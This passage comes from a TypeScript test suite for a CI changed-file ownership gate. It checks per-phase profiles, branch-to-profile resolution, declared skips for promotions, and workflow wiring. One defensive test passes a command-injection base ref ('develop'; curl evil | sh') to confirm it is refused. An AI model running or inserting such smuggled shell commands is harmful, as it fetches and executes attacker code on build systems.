    'apps/api/src/modules/vehicle/application/partner-identity.ts',
    'apps/api/src/modules/crm/application/customer-read-service.ts',
    'apps/api/src/modules/crm/data/customer-read-repository.ts',
    'tests/backend/vehicle-partner-identity.test.ts',
    'docs/phase-1/phase-1-27/final-canonical-remediation.md',
    'scripts/ci/check-phase-ownership.mjs',
  ];

  it('permits the partner-identity remediation to change API source, tests and docs', () => {
    const { failures, counts } = evaluate(BACKEND_CHANGES, 'p1-27-backend-partner-identity');
    expect(failures).toEqual([]);
    expect(counts.apiSource).toBeGreaterThan(0);
  });

  it('forbids the Frontend half from riding along', () => {
    const { failures } = evaluate(
      [...BACKEND_CHANGES, 'apps/web/src/components/party/PartyLabel.tsx'],
      'p1-27-backend-partner-identity'
    );
    expect(failures.some((f) => f.startsWith('web:'))).toBe(true);
  });

  it.each([
    ['a migration', 'supabase/migrations/0121_identity.sql', 'migrations'],
    ['the database', 'supabase/config.toml', 'supabase'],
  ])('still forbids %s', (_label, path, bucket) => {
    const { failures } = evaluate([...BACKEND_CHANGES, path], 'p1-27-backend-partner-identity');
    expect(failures.some((f) => f.startsWith(`${bucket}:`) && f.includes(path))).toBe(true);
  });
});

describe('the webContract bucket', () => {
  /*
   * WHY THE BUCKET EXISTS, stated so the test can outlive the memory of it.
   *
   * `apps/web/src/lib/api/idempotent-operations.ts` is GENERATED and publishes
   * every operation the contract carries, so any new route regenerates it. Two
   * HANDWRITTEN mirrors then assert bidirectional equality against a slice of
   * it. A Backend branch that publishes one `rec.*` route therefore reddens
   * `receptions-contract.test.ts` — and every Backend profile forbids `web`, so
   * that branch is forbidden to fix the file it just broke. Reproduced on the
   * FE-007 branch as `1 failed | 56 passed`, with `rec.receiving-employee-list`
   * published and unmirrored.
   *
   * The danger in the remedy is the opposite one: a bucket wide enough to be
   * convenient reopens the hole every Backend profile exists to close. So the
   * assertions below run in both directions.
   */
  const MIRRORS = [
    'apps/web/src/features/receptions/receptions-contract.ts',
    'apps/web/tests/receptions-contract.test.ts',
    'apps/web/src/features/appointments/appointments-contract.ts',
    'apps/web/tests/appointments-contract.test.ts',
  ];

  /** Handwritten web files that are NOT contract mirrors and must stay `web`. */
  const NOT_MIRRORS = [
    'apps/web/src/features/receptions/components/steps/SignatureStep.tsx',
    'apps/web/src/features/receptions/receptions-api.ts',
    'apps/web/src/features/receptions/work-order-contract.ts',
    'apps/web/src/features/vehicles/duplicates-contract.ts',
    'apps/web/src/lib/customers/vehicles-contract.ts',
    'apps/web/src/lib/api/operation-contract.ts',
    'apps/web/tests/p1-28-reception-media.test.ts',
    'apps/web/src/app/(app)/receptions/page.tsx',
    'apps/web/src/i18n/en.json',
  ];

  it.each(MIRRORS)('classifies %s as webContract', (path) => {
    expect(classify(path)).toBe('webContract');
  });

  it.each(NOT_MIRRORS)('leaves %s in the closed web bucket', (path) => {
    // The anti-vacuity half. `duplicates-contract.ts`, `work-order-contract.ts`
    // and `vehicles-contract.ts` are here on purpose: a `*-contract.ts` pattern
    // would have swallowed all three, and no exhaustiveness assertion touches
    // any of them.
    expect(classify(path)).toBe('web');
  });

  it('is a Backend escape that does not open the web tree', () => {
    const changes = [
      'apps/api/src/app/api/v1/receptions/route.ts',
      'apps/web/src/lib/api/idempotent-operations.ts',
      ...MIRRORS,
    ];
    expect(evaluate(changes, 'p1-18-read-surface').failures).toEqual([]);
    // …and the same profile still refuses a component in the same diff.
    const withComponent = [...changes, NOT_MIRRORS[0] as string];
    expect(
      evaluate(withComponent, 'p1-18-read-surface').failures.some((f) => f.startsWith('web:'))
    ).toBe(true);
  });

  it('is DECLARED by every profile, so no profile permits it by silence', () => {
    /*
     * `evaluate()` fails a bucket only when the profile FORBIDS it by name — a
     * bucket in neither list passes. The module docblock says "anything not
     * listed is forbidden"; the code does not, and this test does not change
     * that behaviour, it removes the reliance on it. Without this, adding
     * `webContract` would have silently widened every profile that previously
     * refused those files under `web`.
     */
    for (const [name, profile] of Object.entries(PROFILES)) {
      const listed = profile.allowed.includes('webContract') || 'webContract' in profile.forbidden;
      expect(listed, `${name} neither allows nor forbids webContract`).toBe(true);
    }
  });

  it('still exists for a reason: both mirrors really do assert exhaustive equality', () => {
    // The bucket is justified by an assertion in another file. If that assertion
    // is deleted or narrowed, the escape hatch has outlived its cause and this
    // says so instead of leaving a permanent hole in the Backend profiles.
    for (const test of [
      'apps/web/tests/receptions-contract.test.ts',
      'apps/web/tests/appointments-contract.test.ts',
    ]) {
      const source = readFileSync(join(REPO_ROOT, test), 'utf8');
      expect(source, `${test} no longer imports the generated manifest`).toContain(
        'PUBLISHED_OPERATIONS'
      );
      expect(source, `${test} no longer asserts exhaustive equality`).toContain(
        'expect(mirrored).toEqual(published)'
      );
    }
  });

  it('is matched before the general web rule, or it could never fire', () => {
    const order = CLASSIFIERS.map((rule) => rule.bucket);
    expect(order.indexOf('webContract')).toBeGreaterThanOrEqual(0);
    expect(order.indexOf('webContract')).toBeLessThan(order.indexOf('web'));
    expect(order.indexOf('webGenerated')).toBeLessThan(order.indexOf('web'));
  });
});

describe('p1-27-frontend profile', () => {
  it('forbids API source under P1-27’s own name, not under P1-26’s', () => {
    /*
     * The gate defaults to `p1-26-frontend` when no profile argument is given,
     * so P1-27 was measured against ANOTHER phase's declaration for its entire
     * life. The rules are identical; the declaration is the point. A phase that
     * borrows a profile has not declared what it may change.
     */
    const { failures } = evaluate(
      ['apps/web/src/features/crm/customers/api.ts', 'apps/api/src/modules/crm/index.ts'],
      'p1-27-frontend'
    );
    expect(failures.some((f) => f.startsWith('apiSource:'))).toBe(true);
    for (const bucket of ['apiSource', 'apiConfig', 'migrations', 'supabase']) {
      expect(Object.keys(PROFILES['p1-27-frontend'].forbidden)).toContain(bucket);
    }
  });

  it('permits exactly what the P1-26 Frontend profile permits', () => {
    // Divergence between two Frontend profiles would be a governance difference
    // nobody decided on. If one is ever loosened, this says so.
    expect([...PROFILES['p1-27-frontend'].allowed].sort()).toEqual(
      [...PROFILES['p1-26-frontend'].allowed].sort()
    );
    expect(Object.keys(PROFILES['p1-27-frontend'].forbidden).sort()).toEqual(
      Object.keys(PROFILES['p1-26-frontend'].forbidden).sort()
    );
  });
});

describe('every profile is SELECTABLE, not merely declared', () => {
  it('is reachable by name from the command line or the environment', () => {
    /*
     * The gate's npm script passes no argument, so every invocation used the
     * `p1-26-frontend` default — which forbids `apiSource` and therefore cannot
     * pass on a Backend branch at all. The two P1-27 profiles were reachable
     * from no script and no workflow: a profile nothing can select is a
     * declaration, not a gate, and that is this phase's own recurring defect
     * appearing in its own tooling.
     *
     * Asserted by reading the script, because the selection happens in `main()`
     * which this file does not call.
     */
    const source = readFileSync(
      join(process.cwd(), 'scripts', 'ci', 'check-phase-ownership.mjs'),
      'utf8'
    );
    expect(source).toContain('process.env.PHASE_OWNERSHIP_PROFILE');
    expect(source).toContain('process.env.PHASE_OWNERSHIP_BASE');
    // And every declared profile must be a name `evaluate` accepts, or the
    // selection mechanism points at nothing.
    for (const name of Object.keys(PROFILES)) {
      const { failures } = evaluate(['apps/web/src/x.ts'], name);
      expect(
        failures.some((f) => f.includes('unknown ownership profile')),
        name
      ).toBe(false);
    }
  });
});

describe('profile declarations', () => {
  it('declares every profile with a reason and disjoint allow/forbid sets', () => {
    for (const [name, profile] of Object.entries(PROFILES)) {
      expect(profile.why, `${name} states why it exists`).toBeTruthy();
      for (const bucket of profile.allowed) {
        expect(Object.keys(profile.forbidden), `${name}: ${bucket}`).not.toContain(bucket);
      }
    }
  });

  it('forbids API source, supabase and migrations in the P1-26 Frontend profile', () => {
    // The three that matter for P1-26's governance statement.
    const forbidden = Object.keys(PROFILES['p1-26-frontend'].forbidden);
    expect(forbidden).toContain('apiSource');
    expect(forbidden).toContain('supabase');
    expect(forbidden).toContain('migrations');
  });
});

describe('a pull-request context resolves a profile and runs the gate', () => {
  it('resolves the head branch against the committed map', () => {
    const verdict = decideOwnershipRun({
      headBranch: 'p1-27/ci-gates',
      baseRef: 'develop',
      eventName: 'pull_request',
      refName: '42/merge',
      rules: RULES,
    });
    expect(verdict.action).toBe('check');
    expect(verdict.checked).toBe(true);
    expect(verdict.profile).toBe('p1-27-frontend');
    expect(verdict.base).toBe('origin/develop');
  });

  it('refuses a head branch no rule claims, rather than defaulting', () => {
    const verdict = decideOwnershipRun({
      headBranch: 'wildcat/whatever',
      baseRef: 'develop',
      eventName: 'pull_request',
      rules: RULES,
    });
    expect(verdict.action).toBe('refuse');
    expect(verdict.checked).toBe(false);
    expect(verdict.reason).toContain('declares no changed-file ownership profile');
  });

  it('refuses an EMPTY map instead of treating it as permissive', () => {
    // An empty `rules` array would otherwise take the same path as an unmapped
    // branch and blame the branch for a broken file.
    const verdict = decideOwnershipRun({
      headBranch: 'p1-27/ci-gates',
      baseRef: 'develop',
      eventName: 'pull_request',
      rules: [],
    });
    expect(verdict.action).toBe('refuse');
    expect(verdict.reason).toContain('declares no rules');
  });
});

describe('the absence of a pull request is never a silent success', () => {
  it.each(PULL_REQUEST_EVENTS)('REFUSES a %s run whose caller passed no refs', (event) => {
    /*
     * The case that makes the whole suite worth having. If a caller drops
     * `head-branch:`, the step must break — not fall through to the skip path
     * and disable the ownership gate for every pull request at once.
     */
    const verdict = decideOwnershipRun({ eventName: event, refName: '7/merge', rules: RULES });
    expect(verdict.action).toBe('refuse');
    expect(verdict.checked).toBe(false);
    expect(verdict.reason).toContain('would judge nothing and report success');
  });

  it('refuses half a context', () => {
    for (const half of [
      { headBranch: 'p1-27/ci-gates', baseRef: '' },
      { headBranch: '', baseRef: 'develop' },
    ]) {
      const verdict = decideOwnershipRun({
        ...half,
        eventName: 'push',
        refName: 'x',
        rules: RULES,
      });
      expect(verdict.action, JSON.stringify(half)).toBe('refuse');
      expect(verdict.reason).toContain('exactly one of the');
    }
  });

  it('refuses a run that cannot name its own event', () => {
    const verdict = decideOwnershipRun({ refName: 'develop', rules: RULES });
    expect(verdict.action).toBe('refuse');
    expect(verdict.reason).toContain('cannot establish its own context');
  });

  it('refuses a push that carries no ref name either', () => {
    const verdict = decideOwnershipRun({ eventName: 'push', rules: RULES });
    expect(verdict.action).toBe('refuse');
    expect(verdict.reason).toContain('no ref name');
  });

  it('refuses an unmapped branch push — the same answer a pull request gets', () => {
    const verdict = decideOwnershipRun({
      eventName: 'workflow_dispatch',
      refName: 'someones-scratch-branch',
      rules: RULES,
    });
    expect(verdict.action).toBe('refuse');
    expect(verdict.reason).toContain('declares no changed-file ownership profile');
  });
});

describe('a push on an ORDINARY branch resolves the profile from the pushed ref', () => {
  // This is the case that used to skip: `pr-ci.yml` also fires on
  // `workflow_dispatch`, where the pull-request fields are empty. There is no
  // pull request, but the profile map is keyed on the branch and the branch is
  // right there.
  it.each([['push'], ['workflow_dispatch']])('%s on a mapped branch runs the gate', (event) => {
    const verdict = decideOwnershipRun({
      eventName: event,
      refName: 'remediation/p1-27-partner-identity',
      rules: RULES,
    });
    expect(verdict.action).toBe('check');
    expect(verdict.checked).toBe(true);
    expect(verdict.profile).toBe('p1-27-backend-partner-identity');
    expect(verdict.base).toBe(DEFAULT_BASE);
  });
});

describe('a promotion is a DECLARED skip, and only a promotion', () => {
  /*
   * Found by opening the first develop -> main promotion since this gate began
   * refusing unmapped branches. It refused, and the refusal was RIGHT — the
   * alternative is borrowing some phase's declaration, which is the exact fault
   * this file exists to prevent, and the message says so.
   *
   * What was missing is not a profile but this case. A pull request whose HEAD
   * is a protected branch is a promotion: it carries the union of every phase
   * that has landed — 921 commits, at the time this was written — and no phase
   * profile could describe it. The gate already refuses to judge a protected
   * branch on a push for exactly that reason; arriving as the head of a pull
   * request does not change it.
   */
  it.each(PROTECTED_BRANCHES)('declares the skip when %s is the pull-request HEAD', (branch) => {
    const onto = branch === 'main' ? 'develop' : 'main';
    const verdict = decideOwnershipRun({
      headBranch: branch,
      baseRef: onto,
      eventName: 'pull_request',
      rules: RULES,
    });
    expect(verdict.action).toBe('declared-skip');
    expect(verdict.checked, 'a promotion must not report that ownership was checked').toBe(false);
    expect(verdict.profile).toBeNull();
    expect(verdict.reason).toContain('DECLARED SKIP');
    expect(verdict.reason).toContain('promotion');
  });

  it('does NOT extend the skip to an ordinary branch that simply has no rule', () => {
    /*
     * The half that keeps this from becoming an escape hatch. A branch nobody
     * mapped is still REFUSED — the skip is granted for being a protected
     * branch, never for being unrecognised, and those two must not blur.
     */
    const unmapped = decideOwnershipRun({
      headBranch: 'wildcat/no-such-rule',
      baseRef: 'develop',
      eventName: 'pull_request',
      rules: RULES,
    });
    expect(unmapped.action, 'an unmapped branch was waved through as a promotion').toBe('refuse');
    expect(unmapped.checked).toBe(false);

    // And an ordinary mapped branch is still CHECKED, against its own profile.
    const mapped = decideOwnershipRun({
      headBranch: 'p1-28/anything',
      baseRef: 'develop',
      eventName: 'pull_request',
      rules: RULES,
    });
    expect(mapped.action).toBe('check');
    expect(mapped.checked).toBe(true);
    expect(mapped.profile).not.toBeNull();
  });
});

describe('a protected push is a DECLARED skip, not a pass', () => {
  it.each(PROTECTED_BRANCHES)('declares the skip on %s and reports checked: false', (branch) => {
    const verdict = decideOwnershipRun({ eventName: 'push', refName: branch, rules: RULES });
    expect(verdict.action).toBe('declared-skip');
    // The property the whole exercise is about: whatever else this run reports,
    // it does not report that ownership was checked.
    expect(verdict.checked).toBe(false);
    expect(verdict.profile).toBeNull();
    expect(verdict.reason).toContain('DECLARED SKIP');
    expect(verdict.reason).toContain('nothing was checked');
  });

  it('is the ONLY outcome that neither checks nor fails', () => {
    /*
     * Enumerated rather than asserted case by case: if a future edit adds a
     * quiet fourth way out, this fails. `checked === false && action !== refuse`
     * is exactly the shape of the defect, and exactly one situation is allowed
     * to have it.
     */
    const situations = [
      { eventName: 'pull_request', headBranch: 'p1-27/x', baseRef: 'develop' },
      { eventName: 'pull_request', refName: '9/merge' },
      { eventName: 'pull_request_target', refName: '9/merge' },
      { eventName: 'push', refName: 'p1-27/x' },
      { eventName: 'push', refName: 'develop' },
      { eventName: 'push', refName: 'main' },
      { eventName: 'push', refName: 'unmapped' },
      { eventName: 'push' },
      { eventName: 'workflow_dispatch', refName: 'develop' },
      { eventName: 'workflow_dispatch', refName: 'feature/p1-27-integration' },
      {},
    ];
    const quiet = situations
      .map((s) => ({ s, v: decideOwnershipRun({ ...s, rules: RULES }) }))
      .filter(({ v }) => v.checked === false && v.action !== 'refuse');
    expect(quiet.map(({ s }) => JSON.stringify(s))).toEqual([
      JSON.stringify({ eventName: 'push', refName: 'develop' }),
      JSON.stringify({ eventName: 'push', refName: 'main' }),
      JSON.stringify({ eventName: 'workflow_dispatch', refName: 'develop' }),
    ]);
    expect(quiet.every(({ v }) => v.action === 'declared-skip')).toBe(true);
  });
});

describe('every profile the map can select is one the ownership gate defines', () => {
  it('resolves to a defined profile for each committed rule', () => {
    expect(RULES.length).toBeGreaterThan(0);
    for (const rule of RULES) {
      const verdict = decideOwnershipRun({
        headBranch: `${rule.branchPrefix}sample`,
        baseRef: 'develop',
        eventName: 'pull_request',
        rules: RULES,
      });
      expect(verdict.action, rule.branchPrefix).toBe('check');
      expect(
        Object.keys(PROFILES),
        `${rule.branchPrefix} resolves to ${verdict.profile}, which check-phase-ownership.mjs does not define`
      ).toContain(verdict.profile);
    }
  });
});

describe('the values the run block sources cannot escape their quotes', () => {
  it('quotes a value containing a single quote', () => {
    expect(shellQuote("a'b")).toBe(`'a'\\''b'`);
  });

  it('emits three keys and nothing derived from a branch name', () => {
    const body = envFileBody(
      decideOwnershipRun({
        headBranch: 'p1-27/ci-gates',
        baseRef: 'develop',
        eventName: 'pull_request',
        rules: RULES,
      })
    );
    expect(body).toContain("OWNERSHIP_ACTION='check'");
    expect(body).toContain("OWNERSHIP_PROFILE='p1-27-frontend'");
    expect(body).toContain("OWNERSHIP_BASE='origin/develop'");
    expect(body).not.toContain('ci-gates');
  });

  it('refuses a base ref that is not a usable ref name', () => {
    // Both defences are live: the value never reaches `shellQuote` at all.
    const verdict = decideOwnershipRun({
      headBranch: 'p1-27/ci-gates',
      baseRef: "develop'; curl evil | sh; '",
      eventName: 'pull_request',
      rules: RULES,
    });
    expect(verdict.action).toBe('refuse');
    expect(verdict.reason).toContain('not a usable ref name');
  });
});

describe('the step is wired to the decision, and the callers are wired to the step', () => {
  const nodeQuality = readFileSync(NODE_QUALITY, 'utf8');
  /** The `Changed-file ownership` step body, indentation and all. */
  const step = (() => {
    const start = nodeQuality.indexOf('- name: Changed-file ownership');
    expect(start, 'the ownership step is gone from _reusable-node-quality.yml').toBeGreaterThan(0);
    const next = nodeQuality.indexOf('\n      - name:', start + 1);
    return nodeQuality.slice(start, next === -1 ? undefined : next);
  })();

  it('delegates the decision to the module rather than to a shell conditional', () => {
    expect(step).toContain('node scripts/ci/check-phase-ownership.mjs --resolve-context');
    expect(step).toContain('OWNERSHIP_EVENT_NAME: ${{ github.event_name }}');
    expect(step).toContain('OWNERSHIP_REF_NAME: ${{ github.ref_name }}');
  });

  it('contains no bare `exit 0` — the shape the defect had', () => {
    /*
     * Stated as a property of the text because that is where the defect lived:
     *
     *     if [ -z "${HEAD_BRANCH}" ] || [ -z "${BASE_REF}" ]; then … exit 0; fi
     *
     * A step that ends itself successfully before doing its work cannot be
     * distinguished from one that did the work, by anything downstream.
     */
    expect(step).not.toMatch(/^\s*exit 0\s*$/m);
  });

  it('runs the ownership gate only on the `check` verdict, and does run it', () => {
    expect(step).toMatch(/if \[ "\$\{OWNERSHIP_ACTION\}" = "check" \]/);
    expect(step).toContain('npm run validate:phase-ownership');
    expect(step).toContain('PHASE_OWNERSHIP_PROFILE="${OWNERSHIP_PROFILE}"');
    expect(step).toContain('PHASE_OWNERSHIP_BASE="${OWNERSHIP_BASE}"');
  });

  it('keeps the declared skip as retrievable evidence', () => {
    expect(step).toContain('--json phase-ownership-context.json');
    expect(nodeQuality).toContain('            phase-ownership-context.json\n');
  });

  it('every pull-request caller of static-quality passes both refs', () => {
    /*
     * The other half of the silent skip. `decideOwnershipRun()` now REFUSES a
     * `pull_request` run with no refs, so a caller that drops one breaks in CI
     * — but it breaks after the pull request is opened. This says so here.
     */
    const callers = readdirSync(WORKFLOWS).filter((f) => f.endsWith('.yml'));
    let checked = 0;
    for (const file of callers) {
      const source = readFileSync(join(WORKFLOWS, file), 'utf8');
      if (!source.includes('_reusable-node-quality.yml')) continue;
      if (!source.includes('task: static-quality')) continue;
      if (!firesOnPullRequest(source)) continue;
      const job = source.slice(source.indexOf('task: static-quality'));
      const body = job.slice(0, job.indexOf('\n\n') === -1 ? undefined : job.indexOf('\n\n'));
      expect(body, `${file} calls static-quality on a pull request without head-branch`).toContain(
        'head-branch:'
      );
      expect(body, `${file} calls static-quality on a pull request without base-ref`).toContain(
        'base-ref:'
      );
      checked += 1;
    }
    // Anti-vacuity: a loop that matched no workflow would pass having asserted
    // nothing, which is the failure mode this whole file is about.
    expect(checked, 'no pull-request caller of static-quality was found at all').toBeGreaterThan(0);
  });

  it('every pull-request caller of web-quality passes base-ref', () => {
    /*
     * The same silent skip, one task over, and it was live.
     *
     * `web-quality` gained a touched-file coverage floor. `coverage-gate.mjs`
     * skips that rule when the changed-file list is empty, and the list is built
     * from `base-ref` — which this caller did not pass. So the reusable workflow
     * defaulted it to `''`, the changed-files step wrote an empty list, and a
     * 60% floor that the baseline described as refusing an untested edit could
     * not fire on a single pull request, with every job green.
     *
     * `static-quality` is asserted above for exactly this reason. Nothing
     * asserted it for `web-quality`, so widening the step's `if:` looked like
     * the fix and left the caller untouched.
     */
    const callers = readdirSync(WORKFLOWS).filter((f) => f.endsWith('.yml'));
    let checked = 0;
    for (const file of callers) {
      const source = readFileSync(join(WORKFLOWS, file), 'utf8');
      if (!source.includes('_reusable-node-quality.yml')) continue;
      if (!source.includes('task: web-quality')) continue;
      if (!firesOnPullRequest(source)) continue;
      const job = source.slice(source.indexOf('task: web-quality'));
      const body = job.slice(0, job.indexOf('\n\n') === -1 ? undefined : job.indexOf('\n\n'));
      expect(
        body,
        `${file} calls web-quality on a pull request without base-ref, so its touched-file ` +
          'coverage floor inspects nothing'
      ).toContain('base-ref:');
      checked += 1;
    }
    expect(checked, 'no pull-request caller of web-quality was found at all').toBeGreaterThan(0);
  });
});
